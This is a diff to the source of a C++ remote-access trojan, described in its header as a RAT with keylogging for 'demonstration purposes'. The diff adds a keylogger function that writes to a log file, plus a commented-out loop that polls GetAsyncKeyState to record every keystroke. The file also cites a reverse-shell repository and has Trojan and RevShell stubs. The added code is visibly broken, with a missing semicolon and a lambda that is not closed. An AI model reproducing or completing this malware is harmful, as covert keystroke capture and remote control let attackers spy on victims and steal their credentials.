@@ -5,7 +5,7 @@ Decription: This is a simple RAT with keylogging functionality written in C++,
             it's to be used exclusively for demonstration purposes
 
 Refferences: https://stackoverflow.com/questions/21582448/creating-a-loading-animation
-             https://www.hackingloops.com/how-to-code-keylogger-in-c-stepwise-by-hackingloops/#:~:text=Technically%2C%20a%20keylogger%20is%20a,key%20strokes%20is%20called%20keylogging.
+             https://www.youtube.com/watch?v=6f1GUyY9TYE
              https://github.com/izenynn/c-reverse-shell
 
 Warning: I am NOT responsible for ANY misuse of this product
@@ -16,11 +16,12 @@ Warning: I am NOT responsible for ANY misuse of this product
 //Libraries to use
 #include <stdio.h>
 #include <iostream>
-
+#include <fstream>
 #include <windows.h>
 #include <winuser.h>
+#include <bits/stdc++.h>
 
-//Define namespace (instead of using std::) & avoid errors
+//Define namespace & avoid errors
 using namespace std; 
 
 
@@ -73,9 +74,46 @@ void Trojan(){
     
 
 }
+
+
 /*################ KEYLOGGER #####################*/
 void Keylogger(){
+    #define LOG_FILE "keylogger.txt" //create log file
+
+    auto saveData = [](string data){
+        fstream logFile;
+
+        logFile.open(LOG_FILE)
+    }
+
+    /*
+    //Define the function that will create and parse the keystrokes
+    auto KeyLog = [](int key_stroke, char *file){
+        //Append the keystrokes to the log file
+        FILE * OUTPUT_FILE;
+        OUTPUT_FILE = fopen(file, "a+");
+        cout << key_stroke << endl;
+
+        //Here we define how to parse special characters
+
+        fclose (OUTPUT_FILE);
+    };
+
+    //------ RUN THE ACTUAL KEYLOGGER -----
+    char i;
+    //using while(true) will run an infinite loop until a break statement is issued
+    while (true) {
+        for(i = 8; i <= 190; i++) {
+            if (GetAsyncKeyState(i) == -32767){
+                KeyLog(i, "testing.txt");
+            }
+        }
+    }
+    system("PAUSE");
+
     printf("Kellog \n");
+
+    */
 }
 /*################ REVERSE SHELL #####################*/
 void RevShell(){
